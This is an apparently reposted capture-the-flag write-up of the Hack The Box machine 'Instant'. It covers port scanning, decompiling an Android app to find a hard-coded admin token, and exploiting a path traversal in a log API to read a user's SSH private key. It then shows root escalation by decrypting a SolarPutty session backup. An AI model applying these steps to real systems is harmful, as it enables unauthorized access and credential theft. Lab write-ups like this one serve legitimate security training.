# :game_die: HTB Instant Writeup. Machine: Instant

> **Original Source:** [HTB Instant Writeup. Machine: Instant](https://infosecwriteups.com/htb-instant-writeup-26f919bafaee)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Machine: Instant


Level: Medium


Type: Linux


Season: Heist (6)

## Reconnaissance


Start with a port scan to see what services are running and open


```
┌──(kali㉿hammer)-[~/htb/instant]
└─$ nmap -sT -Pn -p1-65535 instant.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 01:46 UTC
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
┌──(kali㉿hammer)-[~/htb/instant]
└─$
```


SSH and HTTP services appear to be running and open based on the ports.


Let’s do a quick check on port 80 for interesting links and subdomains


```
┌──(kali㉿hammer)-[~/htb/instant]
└─$ curl http://instant.htb/ | grep instant.htb
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 <a class="nav-link page-scroll d-flex flex-row align-items-center text-primary" href="http://instant.htb/downloads/instant.apk">
<a href="http://instant.htb/downloads/instant.apk" style="text-decoration: none; color:black;">Download Now</a>
<a href="http://instant.htb/downloads/instant.apk" class="btn btn-light">
<p class="text-muted">You can reach us by sending an email to support@instant.htb</p>
<a href="mailto:support@instant.htb" class="btn btn-primary">Contact us</a>
100 16379 100 16379 0 0 403k 0 --:--:-- --:--:-- --:--:-- 410k
<li><a href="mailto:support@instant.htb">Support</a></li>
<li><a href="http://instant.htb/downloads/instant.apk">Download</a></li>
┌──(kali㉿hammer)-[~/htb/instant]
└─$
```


No links to subdomains in the index, but there are multiple references and links to an Android package (.apk).


Download Android package to decompile and inspect


```
┌──(kali㉿hammer)-[~/htb/instant]
└─$ curl http://instant.htb/downloads/instant.apk -o instant.apk
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 5289k 100 5289k 0 0 7429k 0 --:--:-- --:--:-- --:--:-- 7428k
┌──(kali㉿hammer)-[~/htb/instant]
└─$
```


Decompile the Android package with ‘jadx’


```
┌──(kali㉿hammer)-[~/htb/instant]
└─$ jadx /home/kali/htb/instant/instant.apk -d /home/kali/htb/instant/output
INFO - loading ...
INFO - processing ...
ERROR - finished with errors, count: 13
┌──(kali㉿hammer)-[~/htb/instant]
└─$
```


We start by looking for endpoints/hostnames/credentials. Quickly identify API endpoints and calls by running grep for the domain ‘instant.htb’.


```
┌──(kali㉿hammer)-[~/htb/instant/output]
└─$ grep -R instant.htb *
grep: resources/classes.dex: binary file matches
resources/res/xml/network_security_config.xml: <domain includeSubdomains="true"><redacted>.instant.htb
resources/res/xml/network_security_config.xml: <domain includeSubdomains="true"><redacted>.instant.htb
resources/res/layout/activity_forgot_password.xml: android:text="Please contact support@instant.htb to have your account recovered"
sources/com/instantlabs/instant/RegisterActivity.java: new OkHttpClient().newCall(new Request.Builder().url("http://<redacted>.instant.htb/api/v1/register").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.RegisterActivity.3
sources/com/instantlabs/instant/ProfileActivity.java: new OkHttpClient().newCall(new Request.Builder().url("http://<redacted>.instant.htb/api/v1/view/profile").addHeader("Authorization", accessToken).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.ProfileActivity.1
sources/com/instantlabs/instant/AdminActivities.java: new OkHttpClient().newCall(new Request.Builder().url("http://<redacted>.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI...redacted").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
sources/com/instantlabs/instant/LoginActivity.java: new OkHttpClient().newCall(new Request.Builder().url("http://<redacted>.instant.htb/api/v1/login").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.LoginActivity.4
sources/com/instantlabs/instant/TransactionActivity.java: new OkHttpClient().newCall(new Request.Builder().url("http://<redacted>.instant.htb/api/v1/initiate/transaction").addHeader("Authorization", str4).post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new AnonymousClass2(str5, str4));
sources/com/instantlabs/instant/TransactionActivity.java: new OkHttpClient().newCall(new Request.Builder().url("http://<redacted>.instant.htb/api/v1/confirm/pin").header("Authorization", this.val$access_token).post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.TransactionActivity.2.2
┌──(kali㉿hammer)-[~/htb/instant/output]
└─$
```


The ‘AdminActivities.java’ result is interesting and upon closer inspection, that file contains an API endpoint (http://<redacted>.instant.htb/api/v1/view/profile) along with a hard-coded ‘Authorization’ header.


Time to test the authorization code and explore the APIs…


If we access [http://<redacted>.instant.htb](http://swagger-ui.instant.htb/apidocs/)/ we get redirected to [http://<redacted>.instant.htb/apidocs/](http://swagger-ui.instant.htb/apidocs/)


The API’s are not extensive, so it would be possible to audit them manually.


I used Burp Suite Professional to load the API definition and run an automatic ‘API Scan and Audit’ scan.


## Get Tom O'Neill’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


The scan quickly and easily identifies a vulnerable endpoint that can be used to obtain a foothold on the system.

## Foothold


BurpSuite quickly and easily identifies a Local File Inclusion (LFI aka ‘File Path Traversal’) vulnerability in the ‘read/log’ endpoint.


*Vulnerability response*


*Vulnerability request*


While testing the ‘view/logs’ API, it was noted that the log files being read by the APIs are in the user’s home directory.


At this point, we can read the user flag in /home/shirohige/user.txt.


Yay! But we still need server access.


We know we have a Linux machine with SSH running, and we identified a user account whose home directory we can read files from…


Leverage LFI vulnerability to read id_rsa from the shirohige user’s home directory


```
HTTP/1.1 201 CREATED
Date: Mon, 14 Oct 2024 16:11:49 GMT
Server: Werkzeug/3.0.3 Python/3.12.3
Content-Type: application/json
Content-Length: 1842
Connection: close

{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN RSA PRIVATE KEY-----\n","MIIEpAIBAAKCAQEAzCnA9vgcq+ redacted","-----END RSA PRIVATE KEY-----\n"],"Status":201}
```


Access server as ‘shirohige’ via SSH using the id_rsa private key


```
┌──(kali㉿hammer)-[~/htb/instant]
└─$ vi id_rsa
<INSERT RSA KEY>
┌──(kali㉿hammer)-[~/htb/instant]
└─$

┌──(kali㉿hammer)-[~/htb/instant]
└─$ chmod 600 id_rsa
┌──(kali㉿hammer)-[~/htb/instant]
└─$

┌──(kali㉿hammer)-[~/htb/instant]
└─$ ssh shirohige@instant.htb -i id_rsa
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/pro
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.
To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
Last login: Mon Oct 14 15:59:52 2024 from 10.10.14.38
shirohige@instant:~$
```


## Privilege Escalation


Enumeration is always the next step…


While reviewing the contents of the filesystem, found a /opt/backup with a SolarPutty directory and sessions-backup.dat.


Decode the sessions-backup.dat file and view the decoded output to obtain the root credentials ([https://voidsec.com/solarputtydecrypt/](https://voidsec.com/solarputtydecrypt/))


```

"Sessions": [
{
"Id": "066894ee-635c-4578-86d0-d36d4838115b",
"Ip": "10.10.11.37",
"Port": 22,
"ConnectionType": 1,
"SessionName": "Instant",
"Authentication": 0,
"CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
"AuthenticateScript": "00000000-0000-0000-0000-000000000000",
"LastTimeOpen": "0001-01-01T00:00:00",
"OpenCounter": 1,
"SerialLine": null,
"Speed": 0,
"Color": "#FF176998",
"TelnetConnectionWaitSeconds": 1,
"LoggingEnabled": false,
"RemoteDirectory": ""
}
],
"Credentials": [
{
"Id": "452ed919-530e-419b-b721-da76cbe8ed04",
"CredentialsName": "instant-root",
"Username": "root",
"Password": "<redacted>",
"PrivateKeyPath": "",
"Passphrase": "",
"PrivateKeyContent": null
}
],
"AuthScript": [],
"Groups": [],
"Tunnels": [],
"LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```


Login to the user account using the looted SSH key.


Switch to the root account using the password from the sessions-backup.dat and read the root flag.


```
┌──(kali㉿hammer)-[~/htb/instant]
└─$ ssh shirohige@instant.htb -i id_rsa
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/pro
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.
To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ su - root
Password:
root@instant:~# cat root.txt
<flag value>
root@instant:~#
```


Happy Saturday. Happy hacking.

---

*Originally published on [Medium](https://infosecwriteups.com/htb-instant-writeup-26f919bafaee). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
